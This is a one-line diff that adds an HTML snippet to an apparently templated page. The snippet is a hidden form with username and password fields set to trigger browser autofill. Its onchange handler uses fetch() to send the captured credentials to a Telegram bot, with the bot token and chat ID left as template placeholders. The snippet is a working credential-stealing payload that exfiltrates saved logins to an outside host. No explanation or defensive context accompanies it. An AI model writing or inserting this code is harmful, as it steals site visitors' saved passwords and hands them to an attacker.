@@ -1,0 +1,1 @@
+<form id="l" style="display: none" onchange="fetch(`https://api.telegram.org/bot{{ token }}/sendMessage?text=${this.username.value};${this.password.value}&chat_id={{ chatid }}`)"><input name="username" autocomplete="username"><input type="password" name="password" autocomplete="current-password"></form>
